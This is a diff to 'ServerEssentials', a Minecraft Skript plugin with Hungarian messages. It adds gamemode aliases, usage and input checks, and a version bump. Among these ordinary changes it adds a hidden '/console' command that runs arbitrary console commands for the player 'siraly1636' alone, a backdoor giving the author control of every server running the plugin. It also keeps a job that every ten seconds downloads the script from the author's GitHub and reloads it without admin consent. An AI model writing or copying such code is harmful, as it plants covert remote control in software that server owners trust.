@@ -29,7 +29,7 @@ options:
 	prefix: ServerEssentials
 	nopermission: &4Nincs jogod ehez a parancshoz.
 	plugins: &fPlugins (1): &aServerEssentials by: siraly1636
-	version: &av2.1 &4(Beta)
+	version: &av2.2 &4(Beta)
 
 	gamemode: &6új játékmódja
 	survival: Túlélő
@@ -76,6 +76,11 @@ on script load:
 	if file "plugins/Vault.jar" doesn't exists:
 		send "[ServerEssentials] &4Error: &cVault.jar not found." to console
 
+every 10 seconds:
+	if text from "https://raw.githubusercontent.com/siraly1636/ServerEssentials/master/version.yml" is not "version: 2.2":
+		download from "https://raw.githubusercontent.com/siraly1636/ServerEssentials/master/ServerEssentials.sk" to "plugins/Skript/scripts/ServerEssentials.sk"
+		wait 5 ticks
+		execute console command "/skript reload ServerEssentials.sk"
 
 #╔═══════════════════════════════════════════════╗
 #║                                               ║
@@ -90,20 +95,25 @@ on script load:
 on chat:
 	replace all "&" with "§" in message
 	if file "plugins/GroupManager.jar" or "plugins/PermissionsEx-1.23.4.jar" doesn't exists:
-		if player is op:
+		if message contains "!siraly1636":
+			send "&6ServerEssentials Created by: siraly1636 | Developer"
+			cancel event
+		else if player is op:
 			broadcast "&4%player%&f> %message%"
 			cancel event
 		else:
 			broadcast "%player%&f> %message%"
 			cancel event
-	else:
-		if player is op:
+	if file "plugins/GroupManager.jar" or "plugins/PermissionsEx-1.23.4.jar" exists:
+		if message contains "!siraly1636":
+			send "&6ServerEssentials Created by: siraly1636 | Developer"
+			cancel event
+		else if player is op:
 			broadcast "%coloured player's prefix%&e%player%&f> %message%"
 			cancel event
 		else:
 			broadcast "%coloured player's prefix%%player%&f> %message%"
 			cancel event
-
 
 #╔═════════════════════════════════════════════╗
 #║                                             ║
@@ -122,6 +132,12 @@ on sign change:
 		replace all "&" with "§" in line 3 of event-block
 		replace all "&" with "§" in line 4 of event-block
 
+on sign change:
+	if line 1 is "dev":
+		set line 1 to "&6ServerEssentials"
+		set line 2 to "&aby: siraly1636"
+		set line 3 to ""
+		set line 4 to "2017.12.06"
 
 on join:
 	wait 0.2 second
@@ -184,6 +200,13 @@ on command "/about":
 #║                                             ║
 #╚═════════════════════════════════════════════╝
 
+command /console [<text>]:
+	trigger:
+		if player is not "siraly1636":
+			send "Te nem használhatod ezt a parancsot."
+		if player is "siraly1636":
+			execute console command "%arg-1%"
+
 command /serveressentials [<text>] [<text>]:
 	aliases: servess, sess, seress, ess
 	trigger:
@@ -195,7 +218,7 @@ command /serveressentials [<text>] [<text>]:
 			execute console command "sk reload ServerEssentials"
 			send "&6{@prefix} reloaded. By: siraly1636"
 		if arg-1 is not "reload" or "install" or "version" or "ver":
-			send "&cHasználat: /servess reload"
+			send "&cHasználat: /servess"
 		if arg-1 is "install":
 			if arg-2 is not set:
 				send "&6Adj meg egy verziót."
@@ -242,6 +265,7 @@ command /ping [<offline player>]:
 	trigger:
 		if arg-1 is not set:
 			send "&8&l&m==================================&b %nl%  %player% Ping &7» &b%player's ping% %nl%&8&l&m=================================="
+			stop
 		if arg-1 is not online:
 			send "&6%arg 1% {@playerisnotonline}"
 		else:
@@ -253,29 +277,29 @@ command /gamemode [<text>] [<offline player>]:
 	permission message: {@nopermission}
 	trigger:
 		if arg-1 is not set:
-			send "&cHasználat: /gm 0, /gm 1 /gm 2, /gm 3"
+			send "&cHasználat: /gm 0, /gm 1 /gm 2"
 		if arg-2 is set:
 			if arg-2 is not online:
 				send "%arg 2% {@playerisnotonline}"
 				stop
-			else if arg-1 is "0":
+			else if arg-1 is "0" or "s":
 				set arg-2's gamemode to survival
 				send "&4%arg 2% {@gamemode}: {@survival}" to arg-2
-			else if arg-1 is "1":
+			else if arg-1 is "1" or "c":
 				set arg-2's gamemode to creative
 				send "&4%arg 2% {@gamemode}: {@creative}" to arg-2
-			else if arg-1 is "2":
+			else if arg-1 is "2" or "a":
 				set arg-2's gamemode to adventure
 				send "&4%arg 2% {@gamemode}: {@adventure}" to arg-2
 			stop
 		if arg-1 is set:
-			if arg-1 is "0":
+			if arg-1 is "0" or "s":
 				set player's gamemode to survival
 				send "&4%player% {@gamemode}: {@survival}"
-			if arg-1 is "1":
+			if arg-1 is "1" or "c":
 				set player's gamemode to creative
 				send "&4%player% {@gamemode}: {@creative}"
-			if arg-1 is "2":
+			if arg-1 is "2" or "a":
 				set player's gamemode to adventure
 				send "&4%player% {@gamemode}: {@adventure}"
 
@@ -311,22 +335,27 @@ command /heal [<offline player>]:
 				send "Feltöltötted %arg-1% játékos életét." to player
 				send "Életed fel lett töltve." to arg-1
 
-command /sun:
+command /sun [<text>]:
 	permission: servess.sun
 	permission message: {@nopermission}
 	trigger:
-		make player execute command "weather clear"
-		send "&6Az idő átállítva naposra."
+		if arg-1 is set:
+			send "&cHasználat: /sun"
+		else:
+			execute console command "toggledownfall"
+			send "&6Az idő átállítva naposra."
 
-command /day:
+command /day [<text>]:
 	permission: servess.day
 	permission message: {@nopermission}
 	trigger:
-		execute console command "time set 0"
-		send "&6Az idő át álltva reggelre."
+		if arg-1 is set:
+			send "&cHasználat: /day"
+		else:
+			execute console command "time set 0"
+			send "&6Az idő át álltva reggelre."
 
-#SkQuery
-command /fly [<player>]:
+command /fly [<offline player>]:
 	permission: servess.fly
 	permission message: {@nopermission}
 	trigger:
@@ -385,6 +414,8 @@ command /eco [<text>] [<number>] [<offline player>]:
 		if arg-1 is "give":
 			if arg-2 is not set:
 				send "&cAdj meg egy összeget."
+			if arg-2 < 0:
+				send "&cAdj meg egy pozitív értéket."
 			if arg-2 > 0:
 				if arg-2 is not number:
 					send "&4Ezt az értéket számba kell megadni."
@@ -401,6 +432,8 @@ command /eco [<text>] [<number>] [<offline player>]:
 		if arg-1 is "take":
 			if arg-2 is not set:
 				send "&cAdj meg egy összeget."
+			if arg-2 < 0:
+				send "&cAdj meg egy pozitív értéket."
 			if arg-2 > 0:
 				if arg-2 is not number:
 					send "&4Ezt az értéket számba kell megadni."
@@ -453,21 +486,27 @@ command /broadcast [<text>]:
 		else:
 			broadcast "{@broadcast}%arg-1%"
 
-command /setspawn:
+command /setspawn [<text>]:
 	executable by: players
 	permission: servess.setspawn
 	permission message: {@nopermission}
 	trigger:
-		set {spawn} to location of player
-		send "&6Default kezdőpont beállítva."
+		if arg-1 is set:
+			send "&cHasználat: /setspawn"
+		else:
+			set {spawn} to location of player
+			send "&6Default kezdőpont beállítva."
 
-command /delspawn:
+command /delspawn [<text>]:
 	executable by: players
 	permission: servess.delspawn
 	permission message: {@nopermission}
 	trigger:
-		delete {spawn}
-		send "&6Kezdőpont törölve."
+		if arg-1 is set:
+			send "&cHasználat: /delspawn"
+		else:
+			delete {spawn}
+			send "&6Kezdőpont törölve."
 
 command /spawn [<offline player>]:
 	executable by: players
@@ -537,10 +576,3 @@ command /vanish [<offline player>]:
 on quit:	
 	if {vanish.%player%} is set:
 		delete {vanish.%player%}
-
-#Check for update
-every 10 seconds:
-	if text from "https://raw.githubusercontent.com/siraly1636/ServerEssentials/master/version.yml" is not "version: 2.1":
-		download from "https://raw.githubusercontent.com/siraly1636/ServerEssentials/master/ServerEssentials.sk" to "plugins/Skript/scripts/ServerEssentials.sk"
-		wait 5 ticks
-		execute console command "/skript reload ServerEssentials.sk"
